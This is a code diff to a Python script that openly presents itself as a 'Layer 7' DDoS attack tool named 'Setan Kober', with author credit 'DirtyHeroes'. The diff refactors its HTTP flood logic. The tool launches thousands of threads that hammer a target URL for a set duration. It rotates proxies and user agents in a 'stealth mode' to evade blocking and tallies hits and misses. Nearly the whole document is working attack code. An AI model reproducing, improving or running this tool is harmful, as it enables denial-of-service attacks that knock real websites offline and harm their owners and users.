@@ -8,7 +8,6 @@ from tqdm import tqdm
 from colorama import Fore, Style, init
 from datetime import datetime
 import sys
-import simpleaudio as sa
 
 init(autoreset=True)
 
@@ -54,7 +53,7 @@ ascii_art = f"""{Fore.GREEN}
 
 Setan Kober | We Are United | DDOS attack Layer 7
 
-Author: DirtyHeroes ꦗꦺꦴꦲꦂ ꦥꦭꦕꦶꦠ
+Author: DirtyHeroes
 
 """
 
@@ -75,54 +74,109 @@ def check_website_status(url):
     except:
         return False
 
-def attack(target_url, ip, num_threads, duration, use_proxy, stealth):
-    total_strikes = 0
-    total_misses = 0
+def attack_thread(url, proxy_enabled, stealth_mode, user_agents, proxies_list, stop_time):
+    session = requests.Session()
+
+    if proxy_enabled and proxies_list:
+        proxy = random.choice(proxies_list).strip()
+        session.proxies = {
+            "http": proxy,
+            "https": proxy
+        }
+
+    headers = {}
+    if stealth_mode and user_agents:
+        headers["User-Agent"] = random.choice(user_agents).strip()
+
+    while time.time() < stop_time:
+        try:
+            session.get(url, headers=headers, timeout=5)
+        except:
+            pass  # Suppress exceptions in threads
+
+def attack(url, ip, num_threads, duration, proxy_enabled, stealth_mode):
+    print(f"\nLaunching attack on ({ip}) with {num_threads} threads for {duration} seconds...\n")
+
     stop_flag = threading.Event()
     lock = threading.Lock()
+    total_strikes = 0
+    total_misses = 0
+
+    # Load proxies and user agents
+    try:
+        with open("proxies.txt", "r") as f:
+            proxies_list = [p.strip() for p in f if p.strip()]
+    except FileNotFoundError:
+        proxies_list = []
+
+    try:
+        with open("ua.txt", "r") as f:
+            user_agents = [ua.strip() for ua in f if ua.strip()]
+    except FileNotFoundError:
+        user_agents = []
 
     def make_request():
         nonlocal total_strikes, total_misses
         while not stop_flag.is_set():
             try:
-                proxy = random.choice(PROXY_LIST) if use_proxy and PROXY_LIST else None
-                ua = random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0"
+                proxy = random.choice(proxies_list) if proxy_enabled and proxies_list else None
+                ua = random.choice(user_agents) if stealth_mode and user_agents else "Mozilla/5.0"
 
                 headers = {
                     "User-Agent": ua,
                     "Accept": "*/*",
                     "Connection": "keep-alive",
                 }
+
                 proxies = {
                     "http": f"http://{proxy}",
                     "https": f"http://{proxy}",
                 } if proxy else None
 
-                r = requests.get(target_url, headers=headers, proxies=proxies, timeout=5)
+                r = requests.get(url, headers=headers, proxies=proxies, timeout=5)
                 with lock:
-                    total_strikes += 1 if r.status_code < 500 else 0
+                    if r.status_code < 500:
+                        total_strikes += 1
+                    else:
+                        total_misses += 1
             except:
                 with lock:
                     total_misses += 1
-            if stealth:
+
+            if stealth_mode:
                 time.sleep(random.uniform(0.1, 0.3))
 
-    with tqdm(total=num_threads, desc="Launching attack threads", colour="red") as bar:
-        threads = []
+    # Start a tqdm bar for launching threads and duration
+    with tqdm(total=num_threads + duration, desc="Attack Progress", colour="red") as bar:
+        thread_list = []
         for _ in range(num_threads):
             t = threading.Thread(target=make_request)
             t.daemon = True
-            threads.append(t)
             t.start()
+            thread_list.append(t)
             bar.update(1)
+
+        for _ in range(duration):
+            if stop_flag.is_set():
+                break
+            time.sleep(1)
+            bar.update(1)
+
+    stop_flag.set()
+    for t in thread_list:
+        t.join()
+
+    print("\nAttack Complete.")
+    print(f"Hits: {total_strikes}")
+    print(f"Misses: {total_misses}")
 
     try:
         time.sleep(duration)
     except KeyboardInterrupt:
-        print(f"{Fore.YELLOW}Interrupted by user.")
+        print("Interrupted by user.")
     finally:
         stop_flag.set()
-        for t in threads:
+        for t in thread_list:
             t.join()
 
     return (
@@ -132,8 +186,8 @@ def attack(target_url, ip, num_threads, duration, use_proxy, stealth):
         f"IP           : {ip}\n"
         f"Hits         : {total_strikes}\n"
         f"Misses       : {total_misses}\n"
-        f"Proxy        : {'Enabled' if use_proxy else 'Disabled'}\n"
-        f"Stealth      : {'Enabled' if stealth else 'Disabled'}"
+        f"Proxy        : {'Enabled' if proxy_enabled else 'Disabled'}\n"
+        f"Stealth      : {'Enabled' if stealth_mode else 'Disabled'}"
     )
 
 # Interactive CLI Menu
@@ -141,7 +195,7 @@ def main():
     url = ""
     ip = None
     status = None
-    threads = 5000
+    num_threads = 5000
     proxy_enabled = True
     duration = 600
     stealth_mode = True
@@ -154,7 +208,7 @@ def main():
         print(f"Target URL          : {url if url else 'Not Set'}")
         print(f"Target IP           : {ip if ip else 'Not Set'}")
         print(f"Status              : {'ACTIVE' if status else 'NOT Reachable'}" if url else "Status: Not Set")
-        print(f"Threads             : {threads}")
+        print(f"Threads             : {num_threads}")
         print(f"Proxy               : {'Enabled' if proxy_enabled else 'Disabled'}")
         print(f"Stealth Mode        : {'Enabled' if stealth_mode else 'Disabled'}")
         print(f"Duration            : {duration} sec")
@@ -197,7 +251,7 @@ def main():
                 print("Target URL is not set!")
                 input("Press Enter to continue...")
             else:
-                last_attack_summary = attack(url, ip, threads, duration, proxy_enabled, stealth_mode)
+                last_attack_summary = attack(url, ip, num_threads, duration, proxy_enabled, stealth_mode)
                 input("Press Enter to view results...")
         elif choice == "7":
             print("\n--DDOS Terminated--")
